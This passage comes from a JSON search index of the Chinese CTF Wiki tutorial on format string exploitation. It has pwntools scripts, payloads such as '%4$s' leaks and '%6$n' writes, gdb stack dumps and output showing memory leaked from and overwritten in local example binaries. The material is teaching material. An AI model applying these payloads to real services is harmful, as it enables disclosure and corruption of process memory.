__isoc99_scanf@GLIBC_2.7  \u4e0b\u9762\u6211\u4eec\u5229\u7528pwntools\u6784\u9020payload\u5982\u4e0b  from   pwn   import   *  sh   =   process ( ./leakmemory )  leakmemory   =   ELF ( ./leakmemory )  __isoc99_scanf_got   =   leakmemory . got [ __isoc99_scanf ]  print   hex ( __isoc99_scanf_got )  payload   =   p32 ( __isoc99_scanf_got )   +   %4$s  print   payload  gdb . attach ( sh )  sh . sendline ( payload )  sh . recvuntil ( %4$s \\n )  print   hex ( u32 ( sh . recv ()[ 4 : 8 ]))   # remove the first bytes of __isoc99_scanf@got  sh . interactive ()   \u5176\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528gdb.attach(sh)\u6765\u8fdb\u884c\u8c03\u8bd5\u3002\u5f53\u6211\u4eec\u8fd0\u884c\u5230\u7b2c\u4e8c\u4e2aprintf\u51fd\u6570\u7684\u65f6\u5019(\u8bb0\u5f97\u4e0b\u65ad\u70b9)\uff0c\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684\u7b2c\u56db\u4e2a\u53c2\u6570\u786e\u5b9e\u6307\u5411\u6211\u4eec\u7684scanf\u7684\u5730\u5740\uff0c\u8fd9\u91cc\u8f93\u51fa    \u2192   0xf7615670   printf + 0         call     0xf76ebb09   __x86 . get_pc_thunk . ax \n    \u21b3    0xf76ebb09   __x86 . get_pc_thunk . ax + 0   mov      eax ,   DWORD   PTR   [ esp ] \n       0xf76ebb0c   __x86 . get_pc_thunk . ax + 3   ret \n       0xf76ebb0d   __x86 . get_pc_thunk . dx + 0   mov      edx ,   DWORD   PTR   [ esp ] \n       0xf76ebb10   __x86 . get_pc_thunk . dx + 3   ret  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [   stack   ] \u2500\u2500\u2500\u2500  [ 0xffbbf8dc ,   l8 ]  8  0xffbbf8dc \u2502 + 0x00 :   0x080484ce    \u2192    main + 99   add   esp ,   0x10       \u2190   $ esp  0xffbbf8e0 \u2502 + 0x04 :   0xffbbf8f0    \u2192    0x0804a014    \u2192    0xf76280c0    \u2192    __isoc99_scanf + 0   push   ebp  0xffbbf8e4 \u2502 + 0x08 :   0xffbbf8f0    \u2192    0x0804a014    \u2192    0xf76280c0    \u2192    __isoc99_scanf + 0   push   ebp  0xffbbf8e8 \u2502 + 0x0c :   0x000000c2  0xffbbf8ec \u2502 + 0x10 :   0xf765c6bb    \u2192    handle_intel + 107   add   esp ,   0x10  0xffbbf8f0 \u2502 + 0x14 :   0x0804a014    \u2192    0xf76280c0    \u2192    __isoc99_scanf + 0   push   ebp    \u2190   $ eax  0xffbbf8f4 \u2502 + 0x18 :   %4$s  0xffbbf8f8 \u2502 + 0x1c :   0x00000000   \u540c\u65f6\uff0c\u5728\u6211\u4eec\u8fd0\u884c\u7684terminal\u4e0b  \u279c    leakmemory   git :( master )   \u2717   python   exploit . py  [ + ]   Starting   local   process   ./leakmemory :   pid   65363  [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory \n     Arch :       i386 - 32 - little \n     RELRO :      Partial   RELRO \n     Stack :      No   canary   found \n     NX :         NX   enabled \n     PIE :        No   PIE   ( 0x8048000 )  0x804a014 \n\\ x14 \\ xa0 \\ x0 % 4 $ s  [ * ]   running   in   new   terminal :   / usr / bin / gdb   - q    /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory   65363  [ + ]   Waiting   for   debugger :   Done  0xf76280c0  [ * ]   Switching   to   interactive   mode  [ * ]   Process   ./leakmemory   stopped   with   exit   code   0   ( pid   65363 )  [ * ]   Got   EOF   while   reading   in   interactiv   \u6211\u4eec\u786e\u5b9e\u5f97\u5230\u4e86scanf\u7684\u5730\u5740\u3002  \u4f46\u662f\uff0c\u5e76\u4e0d\u662f\u8bf4\u6240\u6709\u7684\u504f\u79fb\u673a\u5668\u5b57\u957f\u7684\u6574\u6570\u500d\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u76f4\u63a5\u76f8\u5e94\u53c2\u6570\u6765\u83b7\u53d6\uff0c\u6709\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u6211\u4eec\u8f93\u5165\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u8fdb\u884c\u586b\u5145\uff0c\u6765\u4f7f\u5f97\u6211\u4eec\u60f3\u8981\u6253\u5370\u7684\u5730\u5740\u5185\u5bb9\u7684\u5730\u5740\u4f4d\u4e8e\u673a\u5668\u5b57\u957f\u6574\u6570\u500d\u7684\u5730\u5740\u5904\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u7684\u8fd9\u4e2a\u6837\u5b50\u3002  [padding][addr]  \u6ce8\u610f   \u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u5728\u547d\u4ee4\u884c\u8f93\u5165\\x0c\\xa0\\x04\\x08%4$s\u8fd9\u662f\u56e0\u4e3a\u867d\u7136\u524d\u9762\u7684\u786e\u5b9e\u662fprintf@got\u7684\u5730\u5740\uff0c\u4f46\u662f\uff0cscanf\u51fd\u6570\u5e76\u4e0d\u4f1a\u5c06\u5176\u8bc6\u522b\u4e3a\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u800c\u662f\u4f1a\u5c06\\,x,0,c\u5206\u522b\u4f5c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u8fdb\u884c\u8bfb\u5165\u3002\u4e0b\u9762\u5c31\u662f\u9519\u8bef\u7684\u4f8b\u5b50\u3002  0xffffccfc\u2502+0x00: 0x080484ce  \u2192   main+99  add esp, 0x10   \u2190  $esp \n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192   \\x0c\\xa0\\x04\\x08%4 $s \n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192   \\x0c\\xa0\\x04\\x08%4 $s \n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192   handle_intel+107  add esp, 0x10\n0xffffcd10\u2502+0x14:  \\x0c\\xa0\\x04\\x08%4 $s    \u2190  $eax \n0xffffcd14\u2502+0x18:  \\xa0\\x04\\x08%4 $s \n0xffffcd18\u2502+0x1c:  \\x04\\x08%4 $s \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  trace  ] \u2500\u2500\u2500\u2500 [ #0] 0xf7e44670 \u2192 Name: __printf(format=0xffffcd10  \\\\x0c\\\\xa0\\\\x04\\\\x08%4$s )  [ #1] 0x80484ce \u2192 Name: main() \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4  x/x 0xffffcd10\n0xffffcd10:   0x6330785c", 
            "title": "\u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_8", 
            "text": "\u4e0a\u9762\uff0c\u6211\u4eec\u5df2\u7ecf\u5c55\u793a\u4e86\u5982\u4f55\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u6cc4\u9732\u6808\u5185\u5b58\u4ee5\u53ca\u4efb\u610f\u5730\u5740\u5185\u5b58\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u4fee\u6539\u6808\u4e0a\u53d8\u91cf\u7684\u503c\u5462\uff0c\u751a\u81f3\u4fee\u6539\u4efb\u610f\u5730\u5740\u53d8\u91cf\u7684\u5185\u5b58\u5462?\u7b54\u6848\u662f\u53ef\u884c\u7684\uff0c\u53ea\u8981\u53d8\u91cf\u5bf9\u5e94\u7684\u5730\u5740\u53ef\u5199\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u4fee\u6539\u5176\u5bf9\u5e94\u7684\u6570\u503c\u3002\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u60f3\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u7c7b\u578b  %n,\u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u662f\u628a\u5df2\u7ecf\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002  \u901a\u8fc7\u8fd9\u4e2a\u7c7b\u578b\u53c2\u6570\uff0c\u518d\u52a0\u4e0a\u4e00\u4e9b\u5c0f\u6280\u5de7\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fbe\u5230\u6211\u4eec\u7684\u76ee\u7684\uff0c\u8fd9\u91cc\u4ecd\u7136\u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u4e00\u90e8\u5206\u4e3a\u8986\u76d6\u6808\u4e0a\u7684\u53d8\u91cf\uff0c\u7b2c\u4e8c\u90e8\u5206\u4e3a\u8986\u76d6\u6307\u5b9a\u5730\u5740\u7684\u53d8\u91cf\u3002  \u8fd9\u91cc\u6211\u4eec\u7ed9\u51fa\u5982\u4e0b\u7684\u7a0b\u5e8f\u6765\u4ecb\u7ecd\u76f8\u5e94\u7684\u90e8\u5206\u3002  /* example/overflow/overflow.c */  #include   stdio.h  int   a   =   123 ,   b   =   456 ;  int   main ()   { \n   int   c   =   789 ; \n   char   s [ 100 ]; \n   printf ( %p \\n ,   c ); \n   scanf ( %s ,   s ); \n   printf ( s ); \n   if   ( c   ==   16 )   { \n     puts ( modified c. ); \n   }   else   if   ( a   ==   2 )   { \n     puts ( modified a for a small number. ); \n   }   else   if   ( b   ==   0x12345678 )   { \n     puts ( modified b for a big number! ); \n   } \n   return   0 ;  }   makefile\u5728\u5bf9\u5e94\u7684\u6587\u4ef6\u5939\u4e2d\u3002\u800c\u65e0\u8bba\u662f\u8986\u76d6\u54ea\u4e2a\u5730\u5740\u7684\u53d8\u91cf\uff0c\u6211\u4eec\u57fa\u672c\u4e0a\u90fd\u662f\u6784\u9020\u7c7b\u4f3c\u5982\u4e0b\u7684payload  ...[overwrite addr]....%[overwrite offset]$n  \u5176\u4e2d...\u8868\u793a\u6211\u4eec\u7684\u586b\u5145\u5185\u5bb9\uff0coverwrite addr \u8868\u793a\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\uff0coverwrite offset\u5730\u5740\u8868\u793a\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\u5b58\u50a8\u7684\u4f4d\u7f6e\u4e3a\u8f93\u51fa\u51fd\u6570\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c\u51e0\u4e2a\u53c2\u6570\u3002\u6240\u4ee5\u4e00\u822c\u6765\u8bf4\uff0c\u4e5f\u662f\u5982\u4e0b\u6b65\u9aa4   \u786e\u5b9a\u8986\u76d6\u5730\u5740  \u786e\u5b9a\u76f8\u5bf9\u504f\u79fb  \u8fdb\u884c\u8986\u76d6", 
            "title": "\u8986\u76d6\u5185\u5b58"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_9", 
            "text": "", 
            "title": "\u8986\u76d6\u6808\u5185\u5b58"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_10", 
            "text": "\u9996\u5148\uff0c\u6211\u4eec\u81ea\u7136\u662f\u6765\u60f3\u529e\u6cd5\u77e5\u9053\u6808\u53d8\u91cfc\u7684\u5730\u5740\u3002\u7531\u4e8e\u76ee\u524d\u51e0\u4e4e\u4e0a\u6240\u6709\u7684\u7a0b\u5e8f\u90fd\u5f00\u542f\u4e86aslr\u4fdd\u62a4\uff0c\u6240\u4ee5\u6808\u7684\u5730\u5740\u4e00\u76f4\u5728\u53d8\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u91cc\u6545\u610f\u8f93\u51fa\u4e86c\u53d8\u91cf\u7684\u5730\u5740\u3002", 
            "title": "\u786e\u5b9a\u8986\u76d6\u5730\u5740"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_11", 
            "text": "\u5176\u6b21\uff0c\u6211\u4eec\u6765\u786e\u5b9a\u4e00\u4e0b\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\u662fprintf\u5c06\u8981\u8f93\u51fa\u7684\u7b2c\u51e0\u4e2a\u53c2\u6570()\u3002 \u8fd9\u91cc\u6211\u4eec\u901a\u8fc7\u4e4b\u524d\u7684\u6cc4\u9732\u6808\u53d8\u91cf\u6570\u503c\u7684\u65b9\u6cd5\u6765\u8fdb\u884c\u64cd\u4f5c\u3002\u901a\u8fc7\u8c03\u8bd5   \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret\n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  ret\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffcd0c ,  l8 ]  8 \n0xffffcd0c\u2502+0x00: 0x080484d7  \u2192   main+76  add esp, 0x10     \u2190  $esp \n0xffffcd10\u2502+0x04: 0xffffcd28  \u2192   %d%d \n0xffffcd14\u2502+0x08: 0xffffcd8c  \u2192  0x00000315\n0xffffcd18\u2502+0x0c: 0x000000c2\n0xffffcd1c\u2502+0x10: 0xf7e8b6bb  \u2192   handle_intel+107  add esp, 0x10\n0xffffcd20\u2502+0x14: 0xffffcd4e  \u2192  0xffff0000  \u2192  0x00000000\n0xffffcd24\u2502+0x18: 0xffffce4c  \u2192  0xffffd07a  \u2192   XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...] \n0xffffcd28\u2502+0x1c:  %d%d      \u2190  $eax   \u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u57280xffffcd28\u5904\u5b58\u50a8\u7740\u53d8\u91cfc\u7684\u6570\u503c\u3002\u7ee7\u800c\uff0c\u6211\u4eec\u518d\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32'%d%d'\u7684\u5730\u57400xffffcd28\u76f8\u5bf9\u4e8eprintf\u51fd\u6570\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u65700xffffcd10\u7684\u504f\u79fb\u4e3a0x18\uff0c\u5373\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f8\u5f53\u4e8eprintf\u51fd\u6570\u7684\u7b2c7\u4e2a\u53c2\u6570\uff0c\u76f8\u5f53\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c6\u4e2a\u53c2\u6570\u3002", 
            "title": "\u786e\u5b9a\u76f8\u5bf9\u504f\u79fb"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_12", 
            "text": "\u8fd9\u6837\uff0c\u7b2c6\u4e2a\u53c2\u6570\u5904\u7684\u503c\u5c31\u662f\u5b58\u50a8\u53d8\u91cfc\u7684\u5730\u5740\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5229\u7528%n\u7684\u7279\u5f81\u6765\u4fee\u6539c\u7684\u503c\u3002payload\u5982\u4e0b  [addr of c]%012d%6$n  addr of c \u7684\u957f\u5ea6\u4e3a4\uff0c\u6545\u800c\u6211\u4eec\u5f97\u518d\u8f93\u516512\u4e2a\u5b57\u7b26\u624d\u53ef\u4ee5\u8fbe\u523016\u4e2a\u5b57\u7b26\uff0c\u4ee5\u4fbf\u4e8e\u6765\u4fee\u6539c\u7684\u503c\u4e3a16\u3002  \u5177\u4f53\u811a\u672c\u5982\u4e0b  def   forc (): \n     sh   =   process ( ./overwrite ) \n     c_addr   =   int ( sh . recvuntil ( \\n ,   drop = True ),   16 ) \n     print   hex ( c_addr ) \n     payload   =   p32 ( c_addr )   +   %012d   +   %6$n \n     print   payload \n     #gdb.attach(sh) \n     sh . sendline ( payload ) \n     print   sh . recv () \n     sh . interactive ()  forc ()   \u7ed3\u679c\u5982\u4e0b  \u279c  overwrite git: ( master )  \u2717 python exploit.py [ + ]  Starting  local  process  ./overwrite : pid  74806 \n0xfffd8cdc\n\u070c\ufffd\ufffd%012d%6 $n \n\u070c\ufffd\ufffd-00000160648modified c.", 
            "title": "\u8fdb\u884c\u8986\u76d6"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_13", 
            "text": "", 
            "title": "\u8986\u76d6\u4efb\u610f\u5730\u5740\u5185\u5b58"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_14", 
            "text": "\u9996\u5148\uff0c\u6211\u4eec\u6765\u8003\u8651\u4e00\u4e0b\u5982\u4f55\u4fee\u6539data\u6bb5\u7684\u53d8\u91cf\u4e3a\u4e00\u4e2a\u8f83\u5c0f\u7684\u6570\u5b57\uff0c\u6bd4\u5982\u8bf4\uff0c \u5c0f\u4e8e\u673a\u5668\u5b57\u957f\u7684\u6570\u5b57 \u3002\u8fd9\u91cc\u4ee52\u4e3a\u4f8b\u3002\u53ef\u80fd\u4f1a\u89c9\u5f97\u8fd9\u5176\u5b9e\u6ca1\u6709\u4ec0\u4e48\u533a\u522b\uff0c\u53ef\u4ed4\u7ec6\u4e00\u60f3\uff0c\u771f\u7684\u6ca1\u6709\u4e48\uff1f\u5982\u679c\u6211\u4eec\u8fd8\u662f\u5c06\u8981\u8986\u76d6\u7684\u5730\u5740\u653e\u5728\u6700\u524d\u9762\uff0c\u90a3\u4e48\u5c06\u76f4\u63a5\u5360\u7528\u673a\u5668\u5b57\u957f\u4e2a(4\u62168)\u5b57\u8282\u3002\u663e\u7136\uff0c\u65e0\u8bba\u4e4b\u540e\u5982\u4f55\u8f93\u51fa\uff0c\u90fd\u53ea\u4f1a\u6bd44\u5927\u3002   \u6216\u8bb8\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6574\u5f62\u6ea2\u51fa\u6765\u4fee\u6539\u5bf9\u5e94\u7684\u5730\u5740\u7684\u503c\uff0c\u4f46\u662f\u8fd9\u6837\u5c06\u9762\u4e34\u7740\u6211\u4eec\u5f97\u4e00\u6b21\u8f93\u51fa\u5927\u91cf\u7684\u5185\u5bb9\u3002\u800c\u8fd9\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u57fa\u672c\u90fd\u4e0d\u4f1a\u653b\u51fb\u6210\u529f\u3002   \u90a3\u4e48\u6211\u4eec\u5e94\u8be5\u600e\u4e48\u505a\u5462\uff1f\u518d\u4ed4\u7ec6\u60f3\u4e00\u4e0b\uff0c\u6211\u4eec\u6709\u5fc5\u8981\u5c06\u6240\u8981\u8986\u76d6\u7684\u53d8\u91cf\u7684\u5730\u5740\u653e\u5728\u5b57\u7b26\u4e32\u7684\u6700\u524d\u9762\u4e48\uff1f\u4f3c\u4e4e\u6ca1\u6709\uff0c\u6211\u4eec\u5f53\u65f6\u53ea\u662f\u4e3a\u4e86\u5bfb\u627e\u504f\u79fb\uff0c\u6240\u4ee5\u624d\u628atag\u653e\u5728\u5b57\u7b26\u4e32\u7684\u6700\u524d\u9762\uff0c\u5982\u679c\u6211\u4eec\u628atag\u653e\u5728\u4e2d\u95f4\uff0c\u5176\u5b9e\u4e5f\u662f\u65e0\u59a8\u7684\u3002\u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u628a\u5730\u5740\u653e\u5728\u4e2d\u95f4\uff0c\u53ea\u8981\u80fd\u591f\u627e\u5230\u5bf9\u5e94\u7684\u504f\u79fb\uff0c\u5176\u7167\u6837\u4e5f\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u6570\u503c\u3002\u524d\u9762\u5df2\u7ecf\u8bf4\u4e86\u6211\u4eec\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4e3a\u7b2c6\u4e2a\u53c2\u6570\u3002\u7531\u4e8e\u6211\u4eec\u60f3\u8981\u628a2\u5199\u5230\u5bf9\u5e94\u7684\u5730\u5740\u5904\uff0c\u6545\u800c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u524d\u9762\u7684\u5b57\u8282\u5fc5\u987b\u662f  aa%k$nxx  \u6b64\u65f6\u5bf9\u5e94\u7684\u5b58\u50a8\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5df2\u7ecf\u5360\u636e\u4e866\u4e2a\u5b57\u7b26\u7684\u4f4d\u7f6e\uff0c\u5982\u679c\u6211\u4eec\u518d\u6dfb\u52a0\u4e24\u4e2a\u5b57\u7b26aa\uff0c\u90a3\u4e48\u5176\u5b9eaa%k\u5c31\u662f\u7b2c6\u4e2a\u53c2\u6570\uff0c$nxx\u5176\u5b9e\u5c31\u662f\u7b2c7\u4e2a\u53c2\u6570\uff0c\u540e\u9762\u6211\u4eec\u5982\u679c\u8ddf\u4e0a\u6211\u4eec\u8981\u8986\u76d6\u7684\u5730\u5740\uff0c\u90a3\u5c31\u662f\u7b2c8\u4e2a\u53c2\u6570\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u8fd9\u91cc\u8bbe\u7f6ek\u4e3a8\uff0c\u5176\u5b9e\u5c31\u53ef\u4ee5\u8986\u76d6\u4e86\u3002  \u5229\u7528ida\u53ef\u4ee5\u5f97\u5230a\u7684\u5730\u5740\u4e3a0x0804A024\uff08\u7531\u4e8ea\u3001b\u662f\u5df2\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\uff0c\u56e0\u6b64\u4e0d\u5728\u5806\u6808\u4e2d\uff09\u3002  .data: 0804 A024                   public   a  .data: 0804 A024   a                 dd   7 Bh   \u6545\u800c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684\u5229\u7528\u4ee3\u7801  def   fora (): \n     sh   =   process ( ./overwrite ) \n     a_addr   =   0x0804A024 \n     payload   =   aa%8$naa   +   p32 ( a_addr ) \n     sh . sendline ( payload ) \n     print   sh . recv () \n     sh . interactive ()   \u5bf9\u5e94\u7684\u7ed3\u679c\u5982\u4e0b  \u279c  overwrite git: ( master )  \u2717 python exploit.py [ + ]  Starting  local  process  ./overwrite : pid  76508  [ * ]  Process  ./overwrite  stopped with  exit  code  0   ( pid  76508 ) \n0xffc1729c\naaaa$ \\x a0 \\x 0modified a  for  a small number.  \u5176\u5b9e\uff0c\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u638c\u63e1\u7684\u5c0f\u6280\u5de7\u5c31\u662f\uff0c\u6211\u4eec\u6ca1\u6709\u5fc5\u8981\u5fc5\u987b\u628a\u5730\u5740\u653e\u5728\u6700\u524d\u9762\uff0c\u653e\u5728\u90a3\u91cc\u90fd\u53ef\u4ee5\uff0c\u53ea\u8981\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u5176\u5bf9\u5e94\u7684\u504f\u79fb\u5373\u53ef\u3002", 
            "title": "\u8986\u76d6\u5c0f\u6570\u5b57"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_15", 
            "text": "\u4e0a\u9762\u4ecb\u7ecd\u4e86\u8986\u76d6\u5c0f\u6570\u5b57\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u5c11\u8986\u76d6\u5927\u6570\u5b57\u4e86\u3002\u4e0a\u9762\u6211\u4eec\u4e5f\u8bf4\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u76f4\u63a5\u4e00\u6b21\u6027\u8f93\u51fa\u5927\u6570\u5b57\u4e2a\u5b57\u8282\u6765\u8fdb\u884c\u8986\u76d6\uff0c\u4f46\u662f\u8fd9\u6837\u57fa\u672c\u4e5f\u4e0d\u4f1a\u6210\u529f\uff0c\u56e0\u4e3a\u592a\u957f\u4e86\u3002\u800c\u4e14\u5373\u4f7f\u6210\u529f\uff0c\u6211\u4eec\u4e00\u6b21\u6027\u7b49\u5f85\u7684\u65f6\u95f4\u4e5f\u592a\u957f\u4e86\uff0c\u90a3\u4e48\u6709\u6ca1\u6709\u4ec0\u4e48\u6bd4\u8f83\u597d\u7684\u65b9\u5f0f\u5462\uff1f\u81ea\u7136\u662f\u6709\u4e86\u3002  \u4e0d\u8fc7\u5728\u4ecb\u7ecd\u4e4b\u524d\uff0c\u6211\u4eec\u5f97\u5148\u518d\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b\uff0c\u53d8\u91cf\u5728\u5185\u5b58\u4e2d\u7684\u5b58\u50a8\u683c\u5f0f\u3002\u9996\u5148\uff0c\u6240\u6709\u7684\u53d8\u91cf\u5728\u5185\u5b58\u4e2d\u90fd\u662f\u4ee5\u5b57\u8282\u8fdb\u884c\u5b58\u50a8\u7684\u3002\u6b64\u5916\uff0c\u5728x86\u548cx64\u7684\u4f53\u7cfb\u7ed3\u6784\u4e2d\uff0c\u53d8\u91cf\u7684\u5b58\u50a8\u683c\u5f0f\u4e3a\u4ee5\u5c0f\u7aef\u5b58\u50a8\uff0c\u5373\u6700\u4f4e\u6709\u6548\u4f4d\u5b58\u50a8\u5728\u4f4e\u5730\u5740\u3002\u4e3e\u4e2a\u4f8b\u5b50\uff0c0x12345678\u5728\u5185\u5b58\u4e2d\u7531\u4f4e\u5730\u5740\u5230\u9ad8\u5730\u5740\u4f9d\u6b21\u4e3a\\x78\\x56\\x34\\x12\u3002\u518d\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u56de\u5fc6\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u91cc\u9762\u7684\u6807\u5fd7\uff0c\u53ef\u4ee5\u53d1\u73b0\u6709\u8fd9\u4e48\u4e24\u4e2a\u6807\u5fd7\uff1a  hh \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0cprintf\u671f\u5f85\u4e00\u4e2a\u4ecechar\u63d0\u5347\u7684int\u5c3a\u5bf8\u7684\u6574\u578b\u53c2\u6570\u3002\nh  \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0cprintf\u671f\u5f85\u4e00\u4e2a\u4eceshort\u63d0\u5347\u7684int\u5c3a\u5bf8\u7684\u6574\u578b\u53c2\u6570\u3002  